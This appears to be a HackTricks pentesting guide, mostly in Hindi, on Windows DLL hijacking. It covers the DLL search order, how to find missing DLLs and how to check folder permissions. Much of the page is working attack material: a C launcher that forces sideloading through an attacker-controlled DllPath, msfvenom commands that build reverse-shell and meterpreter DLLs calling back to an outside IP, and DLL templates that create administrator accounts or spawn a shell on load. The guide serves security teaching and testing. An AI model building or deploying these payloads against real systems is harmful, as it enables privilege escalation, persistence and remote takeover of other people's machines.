# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## मूल जानकारी

DLL Hijacking में एक विश्वसनीय एप्लिकेशन को मैलिशियस DLL लोड करने के लिए हेरफेर करना शामिल होता है। यह शब्द कई रणनीतियों को समाहित करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। यह मुख्यतः code execution, persistence हासिल करने और कम सामान्यतः privilege escalation के लिए उपयोग होता है। हालांकि यहाँ जोर escalation पर है, hijacking की विधि लक्ष्यों के बीच समान रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके उपयोग में लाए जाते हैं, और इनकी प्रभावशीलता एप्लिकेशन की DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: एक वास्तविक DLL को मैलिशियस DLL से बदलना, वैकल्पिक रूप से मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग।
2. **DLL Search Order Hijacking**: मैलिशियस DLL को वैध DLL से पहले किसी सर्च पथ में रखना, एप्लिकेशन के सर्च पैटर्न का फायदा उठाकर।
3. **Phantom DLL Hijacking**: ऐसी मैलिशियस DLL बनाना जिसे एप्लिकेशन लोड कर ले, यह मानकर कि यह आवश्यक DLL मौजूद नहीं था।
4. **DLL Redirection**: %PATH% या .exe.manifest / .exe.local जैसी सर्च पैरामीटरों को बदलकर एप्लिकेशन को मैलिशियस DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में वैध DLL को मैलिशियस कॉन्ट्रापार्ट से बदलना, जो अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: कॉपी किए गए एप्लिकेशन के साथ उपयोगकर्ता-नियंत्रित डायरेक्टरी में मैलिशियस DLL रखना, जो Binary Proxy Execution तकनीकों जैसा होता है।

## गायब DLLs खोजना

सिस्टम के अंदर missing Dlls खोजने का सबसे सामान्य तरीका sysinternals का [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है और **निम्न 2 फिल्टर** सेट करना:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

और केवल **File System Activity** दिखाना:

![](<../../images/image (314).png>)

यदि आप सामान्य रूप से **missing dlls** ढूंढ रहे हैं तो इसे कुछ **सेकंड** के लिए चलने दें.\
यदि आप किसी विशेष executable के अंदर **missing dll** खोज रहे हैं तो आपको **दूसरा फिल्टर जैसे "Process Name" "contains" "\<exec name>"** सेट करना चाहिए, उसे execute करें और events को capture करना बंद कर दें।

## Exploiting Missing Dlls

privileges escalate करने के लिए, सबसे अच्छी संभावना यह है कि हम किसी ऐसे स्थान पर एक DLL लिख सकें जिसे एक privileged process लोड करने की कोशिश करेगा। इसलिए, हम किसी ऐसे **फ़ोल्डर** में **dll लिख** पाएंगे जहाँ उस **dll** की तलाश उस फ़ोल्डर से पहले की जाएगी जहाँ **original dll** है (अजीब केस), या हम किसी ऐसे फ़ोल्डर में लिख पाएंगे जहाँ उस dll को खोजा जाएगा और मूल **dll किसी भी फ़ोल्डर में मौजूद नहीं** होगा।

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows applications DLLs को एक पूर्व-निर्धारित सर्च पथ अनुक्रम का पालन करके खोजते हैं। DLL hijacking तब उत्पन्न होता है जब एक मैलिशियस DLL को रणनीतिक रूप से ऐसे डायरेक्टरी में रखा जाता है कि वह असली DLL से पहले लोड हो जाए। इसे रोकने के लिए समाधान यह है कि एप्लिकेशन जब आवश्यक DLLs का संदर्भ दे तो absolute paths का उपयोग करे।

आप 32-bit सिस्टम पर DLL search order नीचे देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह SafeDllSearchMode सक्षम होने पर डिफ़ॉल्ट सर्च क्रम है। जब यह अक्षम होता है तो current directory दूसरी जगह पर आ जाता है। इस फीचर को अक्षम करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर इसे 0 पर सेट करें (डिफ़ॉल्ट सक्षम है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो सर्च उस executable मॉड्यूल की डायरेक्टरी से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **कभी-कभी dll को केवल नाम के बजाय absolute path बताकर लोड किया जा सकता है**। ऐसे मामले में वह dll केवल उसी path में ही खोजा जाएगा (यदि उस dll के कोई dependencies हैं, तो उन्हें नाम से लोड होने पर सामान्य रूप से खोजा जाएगा)।

सर्च ऑर्डर बदलने के अन्य तरीके भी हैं लेकिन उन्हें मैं यहाँ विस्तार से नहीं समझा रहा हूँ।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

एक उन्नत तरीका जिससे नए बनाए गए प्रोसेस के DLL सर्च पथ को निर्धारित रूप से प्रभावित किया जा सकता है वह है ntdll की native APIs के साथ process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath फ़ील्ड सेट करना। यहाँ एक attacker-नियंत्रित डायरेक्टरी देने से, यदि लक्ष्य प्रोसेस किसी DLL को नाम से resolve करता है (absolute path नहीं और safe loading flags का उपयोग नहीं हो रहा), तो उसे उस डायरेक्टरी से मैलिशियस DLL लोड करने के लिए मजबूर किया जा सकता है।

Key idea
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath प्रदान करें जो आपके नियंत्रित फ़ोल्डर की ओर इशारा करता हो (उदा., जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ प्रक्रिया बनाएं। जब लक्ष्य बाइनरी किसी DLL को नाम से resolve करेगा, तो loader इस प्रदान किए गए DllPath से सुलह करेगा, जिससे भरोसेमंद sideloading संभव हो जाती है भले ही मैलिशियस DLL target EXE के साथ colocated न हो।

Notes/limitations
- यह केवल बन रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है जो केवल current process को प्रभावित करता है।
- लक्ष्य को किसी DLL को नाम से import या LoadLibrary करना चाहिए (absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं होना चाहिए)।
- KnownDLLs और हार्डकोडेड absolute paths hijack नहीं किए जा सकते। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
संचालनात्मक उपयोग का उदाहरण
- अपने DllPath डायरेक्टरी में एक दुष्ट xmllite.dll (जो आवश्यक फ़ंक्शनों को एक्सपोर्ट करता है या असली DLL का प्रॉक्सी करता है) रखें।
- उपरोक्त तकनीक का उपयोग करके xmllite.dll को नाम से लुकअप करने के लिए जाना जाता एक साइन किया गया बाइनरी लॉन्च करें। लोडर दिए गए DllPath के माध्यम से इम्पोर्ट को रेसॉल्व करता है और आपकी DLL को sideloads कर देता है।

यह तकनीक इन-दी-वाइल्ड में मल्टी-स्टेज sideloading चेन चलाने के लिए देखी गई है: एक प्रारंभिक लॉन्चर एक helper DLL ड्रॉप करता है, जो फिर एक Microsoft-signed, hijackable बाइनरी को spawn करता है जिसमें एक कस्टम DllPath होता है ताकि स्टेजिंग डायरेक्टरी से attacker की DLL को जबरदस्ती लोड किया जा सके।


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**आवश्यकताएँ**:

- पहचानें एक ऐसा प्रोसेस जो अलग-अलग **privileges** (horizontal या lateral movement) के अंतर्गत चलता है या चलेगा, और जो **DLL से वंचित** हो।
- सुनिश्चित करें कि किसी भी **डायरेक्टरी** के लिए जहाँ **DLL** की **खोज की जाएगी**, उस पर **write access** उपलब्ध हो। यह स्थान executable की डायरेक्टरी या system path के भीतर कोई डायरेक्टरी हो सकता है।

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **by default it's kind of weird to find a privileged executable missing a dll** और यह और भी **more weird to have write permissions on a system path folder** (आप सामान्यतः ऐसा नहीं कर सकते)। लेकिन, misconfigured environments में यह संभव है.\
यदि आप भाग्यशाली हैं और आवश्यकताओं को पूरा करते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही **main goal of the project is bypass UAC**, आप वहाँ Windows संस्करण के लिए Dll hijacking का एक **PoC** पा सकते हैं जिसका आप उपयोग कर सकते हैं (संभवतः केवल उस फ़ोल्डर के पाथ को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप **किसी फ़ोल्डर में अपनी permissions जाँच सकते हैं** ऐसा करके:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर मौजूद सभी फ़ोल्डरों की permissions जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports को भी निम्न के साथ जांच सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijacking का दुरुपयोग करके privileges बढ़ाने के लिए** with permissions to write in a **System Path folder** check:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास system PATH के किसी भी फ़ोल्डर में लिखने की अनुमति है।\
इस vulnerability का पता लगाने के लिए अन्य रोचक स्वचालित टूल्स में **PowerSploit functions** शामिल हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आपको कोई exploitable scenario मिले तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीज़ों में से एक होगी कि आप ऐसा dll बनाएं जो कम से कम उन सभी functions को export करे जिन्हें executable उससे import करेगा। किसी भी हाल में, ध्यान रखें कि Dll Hijacking उपयोगी होता है [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) या from[ **High Integrity to SYSTEM**](#from-high-integrity-to-system)**.** आप execution के लिए dll hijacking पर केंद्रित इस dll hijacking study में **एक वैध dll कैसे बनाएं** इसका एक उदाहरण पा सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, अगले सेक्शन में आप कुछ बेसिक dll कोड्स पा सकते हैं जो **टेम्पलेट्स** के रूप में या उन non required functions को export करने वाले dll बनाने के लिए उपयोगी हो सकते हैं।

## **Dlls बनाना और संकलित करना**

### **Dll Proxifying**

बुनियादी तौर पर एक **Dll proxy** वह Dll होता है जो लोड होने पर आपका malicious code execute कर सके, लेकिन साथ ही अपेक्षित रूप में expose और work भी करे—यह सब असली लाइब्रेरी को कॉल relay करके किया जाता है।

टूल [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) के साथ आप वास्तव में एक executable निर्दिष्ट कर सकते हैं और वह library चुन सकते हैं जिसे आप proxify करना चाहते हैं और एक proxified dll generate कर सकते हैं, या Dll निर्दिष्ट करके proxified dll generate कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मैंने x64 संस्करण नहीं देखा):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में जो Dll आप compile करते हैं उसे उन फ़ंक्शन्स को **export several functions** करना चाहिए जो victim process द्वारा लोड किए जाएंगे; अगर ये फ़ंक्शन्स मौजूद नहीं हैं तो **binary won't be able to load** उन्हें और **exploit will fail**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## संदर्भ

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
